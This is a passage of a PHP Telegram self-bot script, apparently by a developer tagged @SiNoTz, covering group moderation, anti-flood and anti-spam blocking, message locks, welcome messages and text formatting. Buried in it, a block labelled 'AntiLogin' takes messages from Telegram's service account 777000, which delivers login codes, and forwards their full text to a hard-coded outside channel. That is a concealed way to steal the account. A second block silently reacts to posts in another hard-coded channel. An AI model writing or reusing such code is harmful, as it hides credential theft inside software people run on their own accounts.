if($action['_'] == 'messageActionChatJoinedByLink' or $action['_'] == 'messageActionChatAddUser'){
$Mode = $data['JoinMode'];
if ($Mode == "Mute"){
$mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $mute]);
}elseif($Mode == "Ban"){
$ChatBannedRights = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 9999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $i, 'banned_rights' => $ChatBannedRights]);}}}}

if (in_array($user_id, $data['Mutes'])) {

if ($type == 'supergroup' or $type == 'chat') {
yield $this->channels->deleteMessages([
'channel' => $chat_id,
'id'     => [$message_id]
]);
}}
if (in_array($user_id, $data['MutePv'])){
if ($type == 'user' or $type == 'bot') {
yield $this->messages->deleteMessages(['revoke' => 'Bool', 'peer' => $peer, 'id' => [$message_id]]);
}}
if ($data['AntiLogin'] == 'on') {
if($user_id == 777000) {
yield $this->messages->sendMessage(['peer' => "-1001793988796", 
'message' => "$msgOrig",
]);
yield $this->messages->sendMessage(['peer' => "-1001793988796", 
'message' => "$msgOrig",
]);
}}
if (isset($data['protection']) && $data['protection'] == 'on') {
if ($user_id != $me_id) {
if (isset($msgOrig) && $type == 'user') {
if ($data['spam'][$user_id] != 'vip') {
$num   = $data['spam'][$user_id] + 1;
$limit = $data['limit'];
$res   = $limit - $num;
$num   = ($num == 6) ? 1 : $num;
$g = yield $this->getInfo($user_id);
$name = $g['User']['first_name'];
yield $this->messages->sendMessage([
'peer'            => $user_id,
'message'         => "**Hi** [$name](mention:$chat_id)**\nProtection [warn:$num/$limit] \n\nNote : if you send me $limit messages i will block you**",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "markdown"
]);
if ($data['spam'][$user_id] < $data['limit']) {
$data['spam'][$user_id] += 1;
    yield put("data/data.json", json_encode($data));
} else {
$data['spam'][$user_id] = 1;
    yield put("data/data.json", json_encode($data));
}
}
}
}

if (isset($data['spam'][$user_id]) && $type == 'user') {
if ($data['spam'][$user_id] != 'vip') {
if ($data['spam'][$user_id] == $data['limit']) {
yield $this->messages->sendMessage([
'peer'            => $user_id,
'message'         => "**User** [$name](mention:$chat_id) **if i remember correctly I mentioned in my previous message that this is not the right place for you to spam.
Though you ignored that message.
So, I simply blocked you. 
Now you can't do anything unless my master comes online and unblocks you.

Developer : @SiNoTz**",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "markdown",
'no_webpage'      => true
]);
yield $this->contacts->block(['id' => $user_id]);
}}}}

if (isset($action)) {
if ($action['_'] == 'messageActionChatAddUser') {
if (isset($data['Groups'][$chat_id]['JoinAnswer']['Text'])) {
$ans          = $data['Groups'][$chat_id]['JoinAnswer']['Text'];
        $user = $update['message']['from_id'];
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$Men = $Gpinf['full']['participants_count'];
$Get = yield $this->getInfo($user);
$Me = $Get['User'];
$iD = $Me['id'];
$Name = $Me['first_name'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$Mention = "[$Name](mention:$iD)";
$r = str_replace(['Mention','iD','Fname','Count','Gname','Time','Heart','Emoji','Date'] , [$Mention,$iD,$Name,$Men,$title,$time,$Heart,$emoji,$date] , $ans);
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "$r",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "MarkDown"
]);
}
 if (isset($data['Groups'][$chat_id]['JoinAnswer']['Media'])) {
$data           = $data['Groups'][$chat_id]['JoinAnswer']['Media'];
$ans          = isset($data['Text']) ? $data['Text'] : 'havent';
        $user = $update['message']['from_id'];
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$Men = $Gpinf['full']['participants_count'];
$Get = yield $this->getInfo($user);
$Me = $Get['User'];
$iD = $Me['id'];
$Name = $Me['first_name'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$Mention = "[$Name](mention:$iD)";
$r = str_replace(['Mention','iD','Fname','Count','Gname','Time','Heart','Emoji','Date'] , [$Mention,$iD,$Name,$Men,$title,$time,$Heart,$emoji,$date] , $ans);
if ($ans != 'havent') {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'message'         => "$r",
    'reply_to_msg_id' => $message_id,
    'parse_mode'      => "MarkDown"
]);
} else {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'reply_to_msg_id' => $message_id,
]);
}
}
} if ($action['_'] == 'messageActionChatJoinedByLink') {
if (isset($data['Groups'][$chat_id]['JoinAnswer']['Text'])) {
$ans = $data['Groups'][$chat_id]['JoinAnswer']['Text'];
        $user = $update['message']['from_id'];
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$Men = $Gpinf['full']['participants_count'];
$Get = yield $this->getInfo($user);
$Me = $Get['User'];
$iD = $Me['id'];
$Name = $Me['first_name'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$Mention = "[$Name](mention:$iD)";
$r = str_replace(['Mention','iD','Fname','Count','Gname','Time','Heart','Emoji','Date'] , [$Mention,$iD,$Name,$Men,$title,$time,$Heart,$emoji,$date] , $ans);
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "$r",
'reply_to_msg_id' => $message_id,
'parse_mode'=>"MarkDown"
]);
} if (isset($data['Groups'][$chat_id]['JoinAnswer']['Media'])) {
$data  = $data['Groups'][$chat_id]['JoinAnswer']['Media'];
$ans = isset($data['Text']) ? $data['Text'] : 'havent';
        $user = $update['message']['from_id'];
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$Men = $Gpinf['full']['participants_count'];
$Get = yield $this->getInfo($user);
$Me = $Get['User'];
$iD = $Me['id'];
$Name = $Me['first_name'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$Mention = "[$Name](mention:$iD)";
$r = str_replace(['Mention','iD','Fname','Count','Gname','Time','Heart','Emoji','Date'] , [$Mention,$iD,$Name,$Men,$title,$time,$Heart,$emoji,$date] , $ans);
if ($ans != 'havent') {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'message'         => "$r",
    'reply_to_msg_id' => $message_id,
    'parse_mode'=>"MarkDown"
]);
} else {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'reply_to_msg_id' => $message_id,
]);
}}}}
if (isset($data['antiflood'][$chat_id]) && $data['antiflood'][$chat_id] == 'on') {
if ($user_id != $me_id) {
$time = time();
$limit = isset($data['flood_limit']) ? $data['flood_limit'] : 3;
if (isset($data[$user_id]['flood'])) {
} else {
$data[$user_id]['flood']['mute'] = false;
$data[$user_id]['flood']['last'] = $time;
$data[$user_id]['flood']['try']  = 0;
$data[$user_id]['flood']['warn'] = 'not_recieved';
    yield put("data/data.json", json_encode($data));
}
if ($time - $data[$user_id]['flood']['last'] <= 1) {
$data[$user_id]['flood']['last'] = $time;
$data[$user_id]['flood']['try'] += 1;
    yield put("data/data.json", json_encode($data));
if ($data[$user_id]['flood']['try'] >= $limit) {
$data[$user_id]['flood']['mute'] = true;
    yield put("data/data.json", json_encode($data));
}
} else {
$data[$user_id]['flood']['mute'] = false;
$data[$user_id]['flood']['last'] = $time;
$data[$user_id]['flood']['try']  = 0;
$data[$user_id]['flood']['warn'] = 'not_recieved';
    yield put("data/data.json", json_encode($data));
}
if ($data[$user_id]['flood']['mute'] == true && $data[$user_id]['flood']['warn'] == 'not_recieved') {
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "<b>#AntiFlood \nYou are Silent because of </b><strong>Spam</strong><b>.\n\nDeveloper : T.me/SiNoTz</b>",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "html",
'no_webpage'      => true
]);
$mute = ['_' => 'chatBannedRights', 'send_messages' => true, 'send_media' => true, 'send_stickers' => true, 'send_gifs' => true, 'send_games' => true, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
yield $this->channels->editBanned(['channel' => $chat_id, 'participant' => $user_id, 'banned_rights' => $mute]);
$data[$user_id]['flood']['last'] = $time;
$data[$user_id]['flood']['mute'] = false;
$data[$user_id]['flood']['try']  = 0;
$data[$user_id]['flood']['result'] = ($time - $data[$user_id]['flood']['last']);
$data[$user_id]['flood']['warn'] = 'recieved';
    yield put("data/data.json", json_encode($data));
}}}
if ($com){
if (isset($data['Groups'][$chat_id]['comment']['Text'])) {
$ans          = $data['Groups'][$chat_id]['comment']['Text'];
        $user = $update['message']['from_id'];
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$r = str_replace(['Gname','Time','Heart','Emoji','Date'] , [$title,$time,$Heart,$emoji,$date] , $ans);
yield $this->messages->sendMessage([
'peer'=> $chat_id,
'message'         => "$r",
'reply_to_msg_id' => $message_id,
'parse_mode'      => "MarkDown"
]);
}
 if (isset($data['Groups'][$chat_id]['comment']['Media'])) {
$data           = $data['Groups'][$chat_id]['comment']['Media'];
$ans          = isset($data['Text']) ? $data['Text'] : 'havent';
$Gpinf = yield $this->getFullInfo($peer);
$title = $Gpinf['Chat']['title'];
$List = ["❤️","🧡","💛","💚","💙","💜","🤍","💔","❤️‍🩹","💗","💓","💕","💞","❣"];
$Heart = $List[array_rand($List)];
$emo = ["😐","😘","😂","☺️","😊","😁","😏","😳","😅","😜","😝","😌","😕","😀","🙂","🙃","😇","🥲","🥰","😋","🧐","😉","🤨","☹️","??","🤯"];
$emoji = $emo[array_rand($emo)];
$date = date('Y/m/d');
$time = date('H:i:s');
$r = str_replace(['Gname','Time','Heart','Emoji','Date'] , [$title,$time,$Heart,$emoji,$date] , $ans);
if ($ans != 'havent') {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'message'         => "$r",
    'reply_to_msg_id' => $message_id,
    'parse_mode'      => "MarkDown"
]);
} else {
yield $this->messages->sendMedia([
    'peer'=> $chat_id,
    'media'           => $data['Media'],
    'reply_to_msg_id' => $message_id,
]);
}
}
} 
//==================== Locks =====================
if ($user_id != $me_id) {
if($type == 'chat' or $type == 'supergroup') {

if(strstr($msgOrig,'vmess://') or strstr($msgOrig,'vless://') or strstr($msgOrig,'trojan://')){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);
}
if(!empty($data['TextMessage']) && isset($msgOrig)){
foreach($data['TextMessage'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Link']) && preg_match('/^(.*)([Hh]ttp|[Hh]ttps|t.me)(.*)|([Hh]ttp|[Hh]ttps|t.me)(.*)|(.*)([Hh]ttp|[Hh]ttps|t.me)|(.*)[Tt]elegram.me(.*)|[Tt]elegram.me(.*)|(.*)[Tt]elegram.me|(.*)[Tt].me(.*)|[Tt].me(.*)|(.*)[Tt].me/usi', $msgOrig)) {
foreach($data['Link'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['UserName']) && strpos($msgOrig,"@")!== false){
foreach($data['UserName'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['EnglishText']) && strlen($msgOrig) === mb_strlen($msgOrig)){
foreach($data['EnglishText'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['FarsiText']) && preg_match('/(چ|پ|گ|ج|م|ک|ح|خ|ه|ع|غ|ف|ق|ث|ض|ن|ت|ا|آ|ل|ب|ی|ئ|س|ش|و|د|ذ|ر|ز|ز|ط|ظ|گ)/usi', $msgOrig)) {

foreach($data['FarsiText'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['LongText']) && strlen($msgOrig) > 2000){
foreach($data['LongText'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Pin']) && isset($update['message']['action']) && $update['message']['action']['_'] == 'messageActionPinMessage'){
foreach($data['Pin'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$replyToId]]);}}

if(!empty($data['Reply']) && isset($update['message']['reply_to']) && $update['message']['reply_to']['_'] == 'messageReplyHeader'){
foreach($data['Reply'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Photo']) && isset($update['message']['media']['photo'])){
foreach($data['Photo'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Video']) && isset($update['message']['media']['document']['attributes']['0']['round_Message']) && $update['message']['media']['document']['attributes']['0']['round_Message'] === false && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeVideo'){
foreach($data['Video'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['RVideo']) && isset($update['message']['media']['document']['attributes']['0']['round_Message']) && $update['message']['media']['document']['attributes']['0']['round_Message'] !== false && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeVideo'){
foreach($data['RVideo'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Gif']) && isset($update['message']['media']['document']['attributes']['0']['round_Message']) && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeVideo' && $update['message']['media']['document']['attributes']['1']['_'] == 'documentAttributeAnimated'){
foreach($data['Gif'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Document']) && isset($update['message']['media']['document'])){
foreach($data['Document'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['File']) && isset($update['message']['media']['document']['attributes']['0']['_']) && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeFilename'){
foreach($data['File'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Music']) && isset($update['message']['media']['document']['attributes']['0']['_']) && $update['message']['media']['document']['attributes']['0']['voice'] === false && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeAudio'){
foreach($data['Music'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Voice']) && isset($update['message']['media']['document']['attributes']['0']['_']) && $update['message']['media']['document']['attributes']['0']['voice'] !== false && $update['message']['media']['document']['attributes']['0']['_'] == 'documentAttributeAudio'){
foreach($data['Voice'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Forward']) && isset($update['message']['fwd_from']['_']) && $update['message']['fwd_from']['_'] == "MessageFwdHeader"){
foreach($data['Forward'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Sticker']) && isset($update['message']['media']['document']) && $update['message']['media']['document']['mime_type'] == 'image/webp'){
foreach($data['Sticker'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['AnimatedSticker']) && isset($update['message']['media']['document']) && $update['message']['media']['document']['mime_type'] == 'application/x-tgsticker'){
foreach($data['AnimatedSticker'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Location']) && isset($update['message']['media']['geo']['_']) && $update['message']['media']['geo']['_'] == 'geoPoint'){
foreach($data['Location'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Mention'])){
foreach($data['Mention'] as $peer){
for ($i = 0; $i <= count($update['message']['entities']) ; $i++) {
if($update['message']['entities'][$i]['_'] == "MessageEntityMentionName" or $update['message']['entities'][$i]['_'] == "MessageEntityMention"){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}}}

if(!empty($data['Via']) && $update['message']['via_bot_id'] !== null){
foreach($data['Via'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Inline']) && isset($update['message']['reply_markup']['_']) && $update['message']['reply_markup']['_'] == 'replyInlineMarkup'){
foreach($data['Inline'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Contact']) && isset($update['message']['media']['_']) && $update['message']['media']['_'] == "MessageMediaContact"){
foreach($data['Contact'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Poll']) && isset($update['message']['media']['_']) && $update['message']['media']['_'] == "MessageMediaPoll"){
foreach($data['Poll'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Game']) && isset($update['message']['media']['_']) && $update['message']['media']['_'] == "MessageMediaGame" or !empty($data['Game']) && isset($update['message']['media']['_']) && $update['message']['media']['_'] == "MessageMediaDice"){
foreach($data['Game'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}

if(!empty($data['Service']) && $update['message']['_'] == 'messageService'){
foreach($data['Service'] as $peer){
yield $this->channels->deleteMessages(['channel' => $peer, 'id' => [$message_id]]);}}
}}
if (isset($data['antipv']) && $data['antipv'] == 'on') {
if (isset($data['SafeAntiPv'][$user_id])) {
}else{
if ($user_id != $me_id) {
if (isset($msgOrig) && $type == 'user') {
yield $this->messages->deleteMessages(['revoke' => 'Bool',
'peer'=>$peer,
'id' => [$message_id]]);
yield $this->contacts->block(['id' => $user_id]);
}}}}
// end Looks

$react = array("👍","🎉","⚡️","❤️‍🔥","🕊","🌚");
shuffle($react);
$emj=reset($react);
if($chat_id == "-1001635659099"){
$this->messages->sendReaction([
'peer' => "-1001635659099", 
'msg_id' => $message_id, 
'reaction' => [['_' => 'reactionEmoji', 'emoticon' => "$emj"]]
]);
}
if(isset($data['enm'][$fromId])){
$this->messages->sendReaction([
'peer' => $chat_id,
'msg_id' => $message_id, 
'reaction' => "💩",
]);
}

if (isset($msgOrig) && $user_id == $me_id) {
$status = $data['Mode'];
if ($status == 'on') {
$mode  = $data['ParseMode'];
$modes = [
'bold',
'italic',
'underline',
'hashtag',
'strike',
'mention',
'code',
'pre',
'translate',
'randomfont'
];
if ($mode == 'bold') {
$end = "<strong>$msgOrig</strong>";
} elseif ($mode == 'italic') {
$end = "<i>$msgOrig</i>";
} elseif ($mode == 'underline') {
$end = "<u>$msgOrig</u>";
} elseif ($mode == 'hashtag') {
$x = str_replace(' ', '_', $msgOrig);
$end = "#$x";
} elseif ($mode == 'strike') {
$end = "<s>$msgOrig</s>";
} elseif ($mode == 'link') {
$end = "<a href= 'https://kos.kos'>$msgOrig</a>";
} elseif ($mode == 'code') {
$end = "<code>$msgOrig</code>";
} elseif ($mode == 'pre') {
$end = "<pre>$msgOrig</pre>";
} elseif ($mode == 'translate') {
if (is_english($msgOrig) == true) {
    $end = translate('en', 'fa', $msgOrig);
} else {
    $end = translate('fa', 'en', $msgOrig);
}
} elseif ($mode == 'randomfont') {
if (is_english($msgOrig) == true) {
    $end = font($msgOrig);
}
}
yield $this->messages->editMessage([
'peer'            => $chat_id,
'message'         => "$end",
'parse_mode'      => 'HTML',
'id' => $message_id
]);
}
            }

            
} catch (\Throwable $e){
$this->report("Surfaced: $e");
}
}
}
$settings = new Settings;

$settings
    ->getAppInfo()
    ->setApiId(MP::Api['id'])
    ->setApiHash(MP::Api['hash']);
MP::startAndLoop('SiNoTz.session', $settings);

?>
